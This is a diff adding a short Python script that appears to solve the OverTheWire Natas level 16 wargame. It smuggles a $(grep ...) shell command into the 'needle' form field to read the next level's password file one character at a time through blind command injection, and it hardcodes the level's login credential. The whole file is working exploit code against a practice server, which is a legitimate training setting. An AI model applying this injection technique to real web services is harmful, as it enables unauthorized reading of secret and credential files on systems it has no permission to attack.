@@ -1,0 +1,18 @@
+import requests, string
+
+alphanum = string.ascii_letters + string.digits
+
+def attempt(password):
+    for letter in alphanum:
+        password_test = password + letter
+        r = requests.post('http://natas16.natas.labs.overthewire.org',
+                          data={'needle': "$(grep -e ^" + password_test + " /etc/natas_webpass/natas17)African"},
+                          auth=('natas16', 'WaIHEacj63wnNIBROHeqi3p9t0m5nhmh'))
+
+        if ("African" not in r.text):
+            print("WORKS: " + password_test)
+            return attempt(password_test)
+    return password
+
+password = attempt("")
+print("PASSWORD:", password)
